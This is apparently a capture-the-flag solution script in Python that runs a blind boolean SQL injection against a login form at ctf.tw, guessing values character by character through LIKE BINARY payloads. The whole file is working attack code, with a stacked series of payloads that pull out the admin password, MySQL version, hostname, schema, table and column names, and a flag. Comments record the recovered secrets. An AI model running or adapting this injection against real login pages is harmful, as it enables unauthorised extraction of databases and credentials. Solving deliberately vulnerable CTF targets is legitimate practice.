import httplib2
import urllib
h = httplib2.Http()
 
baseStr = "";
testCharacter="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$^&*()-+={}[]<>/,.'\\\"_"
index = 0
headers = {'Content-type': 'application/x-www-form-urlencoded'}
while index < len(testCharacter):
    # admin/t3st
    data = urllib.urlencode(dict(user="admin' AND password like BINARY \"" + baseStr + testCharacter[index] + "%\"#",password="'"))
    # only admin user
    data = urllib.urlencode(dict(user="admin' AND user like BINARY \"" + baseStr + testCharacter[index] + "%\"#",password="'"))
    # Mysql version = 5
    data = urllib.urlencode(dict(user="admin' AND @@version like BINARY \"" + baseStr + testCharacter[index] + "%\"#",password="'"))
    # current usrs = hw0
    data = urllib.urlencode(dict(user="admin' AND system_user() like BINARY \"" + baseStr + testCharacter[index] + "%\"#",password="'"))
    # current db = ctf
    data = urllib.urlencode(dict(user="admin' AND database() like BINARY \"" + baseStr + testCharacter[index] + "%\"#",password="'"))
    # hostname = 9ccde33323e2
    data = urllib.urlencode(dict(user="admin' AND @@hostname like BINARY \"" + baseStr + testCharacter[index] + "%\"#",password="'"))
    # list dbs = ctf,information
    data = urllib.urlencode(dict(user="admin' AND EXISTS (SELECT * FROM information_schema.schemata WHERE schema_name like BINARY \"" + baseStr + testCharacter[index] + "%\")#", password="'"))
    # table schema = ctf
    data = urllib.urlencode(dict(user="admin' AND EXISTS (SELECT * FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_schema like BINARY \"" + baseStr + testCharacter[index] + "%\")#", password="'"))
    # table_name for schema ctf= top_secret,users
    data = urllib.urlencode(dict(user="admin' AND EXISTS (SELECT * FROM information_schema.columns WHERE table_schema like 'ctf' AND table_name like BINARY \"" + baseStr + testCharacter[index] + "%\")#", password="'"))
    # column_name = tag,value(top_secret table) ,password,user(users table)
    data = urllib.urlencode(dict(user="admin' AND EXISTS (SELECT * FROM information_schema.columns WHERE table_schema like 'ctf' AND table_name like 'users' AND column_name like BINARY \"" + baseStr + testCharacter[index] + "%\")#", password="'"))
    # REVERSE FIND column_name tag,valus BELONG TO table_name top_secret
    data = urllib.urlencode(dict(user="admin' AND EXISTS (SELECT * FROM information_schema.columns WHERE table_schema like 'ctf' AND column_name like 'value' AND table_name like BINARY \"" + baseStr + testCharacter[index] + "%\")#", password="'"))
    # FLAG{298ae98cbbb40dec0c8773ddbac7c3c1}
    data = urllib.urlencode(dict(user="admin' AND EXISTS (SELECT * FROM top_secret WHERE value like BINARY \"" + baseStr + testCharacter[index] + "%\")#", password="'"))
    resp, content = h.request("http://ctf.tw:6003/admin.php", "POST", data, headers=headers)
    if ("Login Succeed!" in str(content)):
        baseStr += testCharacter[index];
        print("Guess Password: " + baseStr)
        index = 0
        continue
    index += 1
print("Final Password: " + baseStr)
